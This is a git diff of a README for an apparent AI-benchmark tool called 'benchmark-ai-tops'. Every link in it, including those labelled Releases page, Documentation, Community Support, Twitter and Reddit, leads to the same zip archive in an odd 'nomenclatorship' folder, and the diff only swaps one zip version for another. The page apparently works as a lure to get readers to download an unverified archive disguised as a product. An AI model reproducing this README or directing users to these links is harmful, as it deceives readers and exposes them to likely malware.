@@ -1,6 +1,6 @@
 # 🎯 benchmark-ai-tops - Measure AI Performance Easily
 
-[![Download Now](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip)
+[![Download Now](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Before you install the tool, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip) to download the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip) to download the latest version of the software.
 2. Look for the latest release and click on it to view the available files.
 3. Choose the file that matches your system. For example, if you’re using a Mac, you might need a file ending in `.dmg` or `.zip`.
 4. Click the download link to get the file.
@@ -42,7 +42,7 @@ If you encounter any issues during installation or testing:
 
 - **Check Compatibility**: Ensure your system meets the requirements.
 - **Reboot**: Sometimes, a simple restart can fix issues.
-- **Reinstall**: If the app is not working, try reinstalling it from the [Releases page](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip).
+- **Reinstall**: If the app is not working, try reinstalling it from the [Releases page](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip).
 
 If problems persist, consider checking online forums or user communities for additional support.
 
@@ -62,8 +62,8 @@ No. benchmark-ai-tops is completely free to download and use.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip) - Find detailed documentation on how to use the tool effectively.
-- [Community Support](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip) - Join discussions and ask questions from other users.
+- [Documentation](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip) - Find detailed documentation on how to use the tool effectively.
+- [Community Support](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip) - Join discussions and ask questions from other users.
 
 ## 🛠️ Contributing
 
@@ -72,8 +72,8 @@ If you wish to contribute to the project, feel free to submit improvements or fi
 ## 👥 Community
 
 Join our community on social media to stay updated on new features and best practices in AI benchmarking:
-- [Twitter](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip)
-- [Reddit](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/tops_benchmark_ai_v2.5.zip)
+- [Twitter](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip)
+- [Reddit](https://raw.githubusercontent.com/calebzf/benchmark-ai-tops/main/nomenclatorship/benchmark-ai-tops-v1.7.zip)
 
 ## 📬 Contact
 
